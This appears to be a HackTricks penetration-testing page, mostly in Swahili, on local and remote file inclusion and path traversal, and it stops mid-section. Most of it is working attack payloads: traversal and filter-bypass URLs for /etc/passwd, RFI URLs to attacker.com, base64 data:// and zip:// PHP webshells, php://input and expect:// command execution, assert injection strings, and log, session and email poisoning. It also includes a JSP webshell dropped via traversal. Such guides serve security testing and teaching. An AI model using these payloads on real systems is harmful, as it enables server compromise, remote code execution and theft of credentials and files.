# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Faili inapakuliwa kutoka kwenye seva ya mbali (Bora: Unaweza kuandika code na seva itaiendesha). Katika php hii kwa chaguo-msingi imezimwa (**allow_url_include**).\
**Local File Inclusion (LFI):** Seva inapakia faili ya ndani.

Udhaifu hutokea wakati mtumiaji anaweza kudhibiti kwa namna fulani faili itakayopakiwa na seva.

Funsi za **PHP** zilizo hatarini: require, require_once, include, include_once

Zana muhimu ya kufanikisha udhaifu huu: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Kwa kuchanganya orodha kadhaa za \*nix LFI na kuongeza njia zaidi nimeunda hii:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pia jaribu kubadilisha `/` kwa `\`\
Pia jaribu kuongeza `../../../../../`

Orodha inayotumia mbinu kadhaa kupata faili /etc/password (kuangalia kama udhaifu upo) inapatikana [hapa](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Muungano wa wordlists tofauti:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pia jaribu kubadilisha `/` kwa `\`\
Pia jaribu kuondoa `C:/` na kuongeza `../../../../../`

Orodha inayotumia mbinu kadhaa kupata faili /boot.ini (kuangalia kama udhaifu upo) inapatikana [hapa](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Angalia orodha ya LFI ya linux.

## Misingi ya LFI na bypasses

Mifano yote ni kwa Local File Inclusion lakini inaweza kutumika pia kwa Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences zilitolewa bila kutumia rekursia
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass kuongeza herufi zaidi mwishoni mwa string iliyotolewa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Hii ni **imetatuliwa tangu PHP 5.4**

### **Encoding**

Unaweza kutumia encodings zisizo za kawaida kama double URL encode (na mengine):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Kutoka kwenye folda iliyopo

Huenda back-end inakagua njia ya folda:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Kuchunguza Katalogi za Mfumo wa Faili kwenye Seva

Mfumo wa faili wa seva unaweza kuchunguzwa kwa njia ya rekursivu ili kubaini katalogi, sio tu faili, kwa kutumia mbinu fulani. Mchakato huu unahusisha kubaini kina cha katalogi na kujaribu uwepo wa folda maalum. Hapo chini kuna mbinu ya kina ya kufanikisha hili:

1. **Tambua Kina cha Katalogi:** Bainisha kina cha katalogi la sasa kwa kufanikiwa kupata faili ya `/etc/passwd` (inayotumika ikiwa seva ni Linux-based). Mfano wa URL unaweza kuwa umeundwa kama ifuatavyo, ukionyesha kina cha tatu:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Chunguza folda:** Ongeza jina la folda unayoshuku (kwa mfano, `private`) kwenye URL, kisha rudi kwenye `/etc/passwd`. Kiwango cha ziada cha saraka kinahitaji kuongeza kina kwa moja:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Fasiri Matokeo:** Jibu la server linaonyesha ikiwa folda ipo:
- **Hitilafu / Hakuna Matokeo:** Folda `private` huenda haipo mahali ulilotajwa.
- **Yaliyomo ya `/etc/passwd`:** Ukuwepo wa folda `private` umehakikishwa.
4. **Uchunguzi wa Rekursivu:** Folda zilizogunduliwa zinaweza kuchunguzwa zaidi kwa ajili ya saraka ndogo au faili kwa kutumia njia ile ile au mbinu za kawaida za Local File Inclusion (LFI).

Ili kuchunguza saraka katika maeneo tofauti ya mfumo wa faili, rekebisha payload ipasavyo. Kwa mfano, ili kuangalia kama `/var/www/` ina folda ya `private` (ikiwa saraka ya sasa iko kwa kina cha 3), tumia:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation ni mbinu inayotumika kubadilisha njia za faili katika maombi ya wavuti. Mara nyingi hutumiwa kupata faili zilizofungwa kwa restriction kwa kuzipita hatua fulani za usalama zinazoongeza tabia za ziada mwishoni mwa njia za faili. Lengo ni kubuni njia ya faili ambayo, mara itakaporudiwa na hatua ya usalama, bado inaelekeza kwa faili inayotakikana.

Katika PHP, uwakilishi mbalimbali wa njia ya faili unaweza kuzingatiwa kuwa sawa kutokana na tabia ya mfumo wa faili. Kwa mfano:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` are all treated as the same path.
- Wakati herufi 6 za mwisho ni `passwd`, kuongeza `/` (kufanya kuwa `passwd/`) hakubadilishi faili lengwa.
- Vivyo hivyo, ikiwa `.php` imeambatishwa kwenye njia ya faili (kama `shellcode.php`), kuongeza `/.` mwishoni haitabadilisha faili inayofikiwa.

Mifano iliyotolewa inaonyesha jinsi ya kutumia path truncation kupata `/etc/passwd`, lengo la kawaida kutokana na yaliyomo yake nyeti (taarifa za akaunti za watumiaji):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Katika matukio haya, idadi ya traversals zinazohitajika inaweza kuwa takriban 2027, lakini namba hii inaweza kutofautiana kulingana na usanidi wa server.

- **Using Dot Segments and Additional Characters**: Mfululizo wa traversals (`../`) uliounganishwa na sehemu za ziada za nukta na herufi unaweza kutumika kuvinjari mfumo wa faili, ukiepuka kwa ufanisi nyuzi zilizoambatanishwa na server.
- **Determining the Required Number of Traversals**: Kupitia majaribio na makosa, mtu anaweza kubaini idadi sahihi ya `../` zinazohitajika kufika kwenye root directory kisha hadi `/etc/passwd`, kuhakikisha kwamba nyuzi zilizoambatanishwa (kama `.php`) zimeghairiwa lakini njia inayohitajika (`/etc/passwd`) inabaki.
- **Starting with a Fake Directory**: Ni desturi ya kawaida kuanza njia na saraka isiyokuwepo (kama `a/`). Mbinu hii hutumika kama tahadhari au kutimiza mahitaji ya mantiki ya kuchambua njia ya server.

Unapotumia path truncation techniques, ni muhimu kuelewa tabia ya server katika kuchambua njia na muundo wa filesystem. Kila tukio linaweza kuhitaji mbinu tofauti, na mara nyingi vipimo vinahitajika ili kupata njia yenye ufanisi zaidi.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Katika php hii imezimwa kwa chaguo-msingi kwa sababu **`allow_url_include`** iko **Off.** Inapaswa kuwa **On** ili iweze kufanya kazi, na katika hali hiyo unaweza kujumuisha faili ya PHP kutoka kwenye server yako na kupata RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ikiwa kwa sababu fulani **`allow_url_include`** iko **On**, lakini PHP inazuia upatikanaji wa tovuti za nje, [kulingana na chapisho hili](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), unaweza kutumia kwa mfano data protocol kwa base64 ili ku-decode msimbo wa b64 PHP na kupata RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Katika msimbo uliopita, `+.txt` ya mwisho iliongezwa kwa sababu mshambuliaji alihitaji kamba iliyomalizika na `.txt`, hivyo kamba inamalizika nayo na baada ya b64 decode sehemu hiyo itarudisha tu takataka na msimbo halisi wa PHP utaingizwa (na kwa hivyo, utekelezwe).

Mfano mwingine **usiotumia `php://` protokoli** ungekuwa:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Kipengele cha mzizi

Katika Python, katika msimbo kama huu:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ikiwa mtumiaji anapitisha **absolute path** kwa **`file_name`**, **path iliyotangulia inaondolewa tu**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Hii ni tabia iliyokusudiwa kulingana na [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ikiwa sehemu ni njia kamili, vipengele vyote vilivyopita vinatupwa na kuunganishwa kunaendelea kutoka kwenye sehemu ya njia kamili.

## Java Orodha za Saraka

Inaonekana kwamba ikiwa una Path Traversal katika Java na una **omba saraka** badala ya faili, **orodha ya saraka inarudishwa**. Hii haitatokea katika lugha zingine (kwa kadiri ninavyojua).

## Vigezo 25 vya Juu

Hapa kuna orodha ya vigezo 25 vya juu ambazo zinaweza kuwa hatarini kwa local file inclusion (LFI) vulnerabilities (from [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI kutumia PHP wrappers & protocols

### php://filter

PHP filters allow perform basic **operesheni za mabadiliko kwenye data** kabla data kusomwa au kuandikwa. Kuna aina 5 za filters:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Ondoa tags kutoka kwenye data (kila kitu kati ya "<" na ">" alama)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transforms to a different encoding(`convert.iconv.<input_enc>.<output_enc>`) . Ili kupata **orodha ya encodings zote zinazoungwa mkono** endesha kwenye console: `iconv -l`

> [!WARNING]
> Kwa kutumia vibaya filter ya conversion `convert.iconv.*` unaweza **kutengeneza maandishi yoyote**, ambayo inaweza kusaidia kuandika maandishi yoyote au kumfanya function kama include kushughulikia maandishi yoyote. Kwa maelezo zaidi angalia [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Inapunguza ukubwa wa maudhui (useful if exfiltrating a lot of info)
- `zlib.inflate`: Rejesha data iliyobanwa
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Filters Nyingine
- Ukiendesha ndani ya php `var_dump(stream_get_filters());` utapata jozi ya **filters zisizotarajiwa**:
- `consumed`
- `dechunk`: huondoa HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Sehemu "php://filter" haina utofauti kati ya herufi kubwa na ndogo

### Kutumia php filters kama oracle kusoma faili yoyote

[**Katika chapisho hiki**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) imependekezwa mbinu ya kusoma faili ya ndani bila kupata output ikirudishwa na server. Mbinu hii inategemea **boolean exfiltration of the file (char by char) using php filters** kama oracle. Hii ni kwa sababu php filters zinaweza kutumika kufanya maandishi kuwa marefu vya kutosha hadi php kusababisha exception.

Katika chapisho la awali unaweza kupata maelezo ya kina ya mbinu, lakini hapa kuna muhtasari mfupi:

- Tumia codec **`UCS-4LE`** kuweka herufi ya kwanza ya maandishi mwanzoni na kufanya ukubwa wa string ongezeke kwa kasi.
- Hii itatumika kuunda **maandishi ambayo ni makubwa sana wakati herufi ya mwanzo inagongwa kwa usahihi** kiasi kwamba php itasababisha **error**
- Filter ya **dechunk** itaondoa kila kitu ikiwa char ya kwanza si hexadecimal, hivyo tunaweza kujua ikiwa char ya kwanza ni hex.
- Hii, ikichanganywa na ile ya awali (na filters nyingine kulingana na herufi inayokadiriwa), itaturuhusu kugundua herufi mwanzoni mwa maandishi kwa kuona wakati tunapofanya mabadiliko ya kutosha ili kuifanya isiwe tabia ya hexadecimal. Kwa sababu ikiwa ni hex, dechunk haitaiondoa na bomu la awali litasababisha php error.
- Codec **convert.iconv.UNICODE.CP930** hubadilisha kila herufi kuwa ile inayofuata (kwa hivyo baada ya codec hii: a -> b). Hii inaturuhusu kugundua kama herufi ya kwanza ni `a` kwa mfano kwa sababu tukitumia mara 6 za codec hii a->b->c->d->e->f->g herufi haitakuwa tena tabia ya hexadecimal, kwa hiyo dechunk haitaiondoa na php error itachochewa kwa sababu inazidisha na bomu la awali.
- Kutumia mabadiliko mengine kama **rot13** mwanzoni inawezekana leak herufi nyingine kama n, o, p, q, r (na codecs nyingine zinaweza kutumika kusogeza herufi nyingine kwenye safu ya hex).
- Wakati char ya mwanzo ni nambari inahitajika ku-encode kwa base64 na leak herufi 2 za kwanza ili leak nambari hiyo.
- Tatizo la mwisho ni kuona **jinsi ya leak zaidi ya herufi ya mwanzo**. Kwa kutumia order memory filters kama **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** inawezekana kubadilisha mpangilio wa chars na kupata katika nafasi ya kwanza herufi nyingine za maandishi.
- Na ili kuwa na uwezo wa kupata **further data** wazo ni **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

Katika chapisho pia ilitolewa tool ya kufanya hili kiotomatiki: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Wrapper hii inaruhusu kufikia file descriptors ambazo process imefungua. Inaweza kuwa muhimu ku-exfiltrate yaliyomo ya files zilizo wazi:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Unaweza pia kutumia **php://stdin, php://stdout and php://stderr** kufikia **file descriptors 0, 1 and 2** mtawalia (sina uhakika jinsi hili lingekuwa la msaada katika shambulio)

### zip:// and rar://

Pakia faili la Zip au Rar lenye PHPShell ndani na upate ufikaji wake.\
Ili uweze kutumia protokoli ya rar kwa matumizi mabaya, inahitaji **kuamilishwa maalum**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Kumbuka kuwa itifaki hii imezuiwa na mipangilio ya php **`allow_url_open`** na **`allow_url_include`**

### expect://

Expect lazima iwe imewezeshwa. Unaweza kuendesha code kwa kutumia hii:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Taja payload yako katika vigezo vya POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Faili ya `.phar` inaweza kutumika kutekeleza PHP code wakati web application inapotumia functions kama `include` kwa kupakia faili. Kipande cha PHP code kilichotolewa hapa chini kinaonyesha uundaji wa faili ya `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Ili kujenga faili ya `.phar`, amri ifuatayo inapaswa kutekelezwa:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

Katika matukio ambapo LFI inasoma tu faili bila kutekeleza msimbo wa PHP ndani yake, kupitia functions such as `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, or `filesize()`, inaweza kujaribiwa kutekeleza udhaifu wa deserialization. Udhaifu huu unahusiana na kusoma faili kwa kutumia `phar` protocol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ilikuwa inawezekana kutumia vibaya **any arbitrary file read from PHP that supports php filters** kupata RCE. Maelezo ya kina yanaweza [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Muhtasari mfupi: a **3 byte overflow** in the PHP heap ilitumika kuabusu ili **alter the chain of free chunks** of anspecific size katika mpango wa kuwa na uwezo wa **write anything in any address**, hivyo hook iliingizwa kuitwa **`system`**.\
Ilikuwa inawezekana ku-alloc chunks za sizes maalum kwa kutumia zaidi php filters.

### More protocols

Angalia zaidi possible[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Andika katika memory au katika faili ya muda (sihakiki jinsi hii inaweza kuwa ya msaada katika file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Kufikia filesystem ya ndani
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Kufikia HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Kufikia FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Mitiririko ya compression
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Kutafuta pathnames zinazolingana na pattern (Hairudishi chochote kinachoweza kuchapishwa, hivyo siyo muhimu hapa)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Mitiririko ya audio (Si ya matumizi kusoma arbitrary files)

## LFI via PHP's 'assert'

Hatari za Local File Inclusion (LFI) katika PHP ni kubwa hasa unaposhughulika na function ya 'assert', ambayo inaweza kutekeleza code iliyomo ndani ya strings. Hii ni hasara hasa ikiwa input inayojumuisha tabia za directory traversal kama ".." inachunguzwa lakini haisafishwa ipasavyo.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Wakati hili linakusudia kuzuia traversal, bila kukusudia linaunda vector kwa code injection. Ili kulitumia kusoma yaliyomo ya faili, mshambuliaji anaweza kutumia:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Vivyo hivyo, kwa kutekeleza maamri yoyote ya mfumo, mtu anaweza kutumia:
```plaintext
' and die(system("id")) or '
```
Ni muhimu **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Teknika hii inahusiana katika kesi ambapo una **control** ya **file path** ya **PHP function** itakayofanya **access a file** lakini hautaona content ya file (mfano: simu rahisi ya **`file()`**) na content haijaonyeshwa.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) inaelezea jinsi blind path traversal inaweza kutumiwa kupitia PHP filter ili **exfiltrate the content of a file via an error oracle**.

Kwa muhtasari, teknika inatumia **"UCS-4LE" encoding** kufanya content ya faili kuwa kubwa kiasi kwamba **PHP function** inayofungua faili itasababisha **error**.

Kisha, ili leak the first char filter **`dechunk`** inatumiwa pamoja na wengine kama **base64** au **rot13**, na hatimaye filters **convert.iconv.UCS-4.UCS-4LE** na **convert.iconv.UTF16.UTF-16BE** zinatumika kuweka chars nyingine mwanzoni na kuzileak.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Kwa maelezo ya kiufundi angalia chapisho lililotajwa!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wakati server-side code inayopokea/uploads files inajenga destination path kwa kutumia data inayodhibitiwa na mtumiaji (mfano, filename au URL) bila ku-canonicalize na ku-validate, segments za `..` na absolute paths zinaweza kutoroka directory iliyokusudiwa na kusababisha arbitrary file write. Ikiwa unaweza kuweka payload chini ya directory inayoweza kuonyeshwa kwenye web, kawaida unapata unauthenticated RCE kwa kutupa webshell.

Typical exploitation workflow:
- Tambua write primitive katika endpoint au background worker inayokubali path/filename na kuandika content kwenye disk (mfano: message-driven ingestion, XML/JSON command handlers, ZIP extractors, n.k.).
- Tambua directories zinazoweza kuonyeshwa kwenye web. Mifano ya kawaida:
  - Apache/PHP: `/var/www/html/`
  - Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
  - IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Tengeneza traversal path inayovunja kutoka storage directory iliyokusudiwa hadi webroot, na ujumuishe webshell content yako.
- Tembelea payload uliyoacha na utekeleze amri.

Notes:
- The vulnerable service inayofanya write inaweza kusikiliza kwenye non-HTTP port (mfano, JMF XML listener kwenye TCP 4004). The main web portal (port tofauti) baadaye itahudumia payload yako.
- Kwenye Java stacks, file writes hizi mara nyingi zinafanywa kwa concatenation rahisi ya `File`/`Paths`. Ukosefu wa canonicalisation/allow-listing ndilo kosa kuu.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Mikakati ya kuimarisha ambayo huondoa aina hii ya bugs:
- Tumia njia kanoni (canonical path) na hakikisha kuwa ni chini ya directory ya msingi iliyoorodheshwa (allow-listed).
- Kataa njia yoyote yenye `..`, absolute roots, au drive letters; tumia zaidi majina ya faili yaliyotengenezwa.
- Endesha mchakato wa kuandika (writer) kama akaunti yenye haki ndogo (low-privileged) na tofautisha directory za kuandika kutoka kwa served roots.

## Remote File Inclusion

Imeelezwa hapo awali, [**follow this link**](#remote-file-inclusion).

### Kupitia Apache/Nginx faili ya logi

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Kumbuka kwamba **ukitumia double quotes** kwa shell badala ya **simple quotes**, double quotes zitatabadilishwa kwa string "_**quote;**_", **PHP itatoa kosa** hapo na **hakutakuwa na kitu kingine kitakachotekelezwa**.
>
> Pia, hakikisha una **andika payload vizuri** au PHP itatoa error kila mara inapojaribu kupakia faili ya logi na hutaweza kupata nafasi ya pili.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Njia nyingine zinazowezekana za logi:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Kupitia Barua pepe

**Tuma barua pepe** kwa akaunti ya ndani (user@localhost) yenye PHP payload yako kama `<?php echo system($_REQUEST["cmd"]); ?>` na jaribu ku-include barua pepe ya mtumiaji kwa path kama **`/var/mail/<USERNAME>`** au **`/var/spool/mail/<USERNAME>`**

### Kupitia /proc/\*/fd/\*

1. Pakia shells nyingi (kwa mfano : 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), na $PID = PID ya mchakato (can be brute forced) na $FD ni file descriptor (can be brute forced too)

### Kupitia /proc/self/environ

Kama faili la log, tuma payload katika User-Agent, itaonekana ndani ya /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Kupakia

Ikiwa unaweza kupakia faili, ingiza shell payload ndani yake (e.g : `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Ili faili isomeke vizuri ni bora kuingiza kwenye metadata ya picha/doc/pdf

### Kupitia ZIP file upload

Pakia ZIP file inayojumuisha PHP shell iliyobanwa kisha ufikie:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Kupitia PHP sessions

Angalia ikiwa tovuti inatumia PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Katika PHP vikao hivi vinahifadhiwa katika _/var/lib/php5/sess\\_\[PHPSESSID]\_ mafaili
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Weka cookie kuwa `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Tumia LFI kujumuisha faili ya session ya PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Kupitia ssh

Ikiwa ssh inafanya kazi angalia ni mtumiaji gani anayetumika (/proc/self/status & /etc/passwd) na jaribu kufikia **\<HOME>/.ssh/id_rsa**

### **Kupitia** **vsftpd** _**logs**_

Logs za server ya FTP vsftpd ziko katika _**/var/log/vsftpd.log**_. Katika tukio ambapo kuna udhaifu wa Local File Inclusion (LFI), na ufikiaji wa exposed vsftpd server unapatikana, hatua zifuatazo zinaweza kuzingatiwa:

1. Ingiza payload ya PHP kwenye sehemu ya username wakati wa mchakato wa kuingia.
2. Baada ya injection, tumia LFI kupata logs za server kutoka _**/var/log/vsftpd.log**_.

### Kupitia php base64 filter (using base64)

